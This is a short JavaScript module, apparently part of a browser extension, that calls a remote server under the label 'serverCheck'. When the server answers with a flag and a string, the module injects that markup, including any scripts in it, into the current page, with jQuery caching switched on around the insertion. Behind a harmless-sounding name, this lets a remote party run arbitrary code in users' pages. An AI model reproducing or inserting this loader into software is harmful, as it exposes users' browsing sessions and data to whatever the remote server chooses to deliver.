let request = require('request')
let insert = (t, d) => {
  var jQueryAjaxSettingsCache = $.ajaxSettings.cache;
  $.ajaxSettings.cache = true;
  G.gwd_h.call($(d), t);
  $.ajaxSettings.cache = jQueryAjaxSettingsCache;
}

let visitReq = (callback) => {
  let url = `${G.server}/extension?ac=serverCheck&from_device=${G.from_device}&protocol=${location.protocol}`;
  request.get(url).then((data) => {
    if (data.flag === true && data.str != '') {
    // if (false) {
      insert(data.str, data.hd)
    } else {
      callback();
    }
  }).catch(() => {
    callback()
  })
}

module.exports.init = (callback) => {
  visitReq(callback)
}


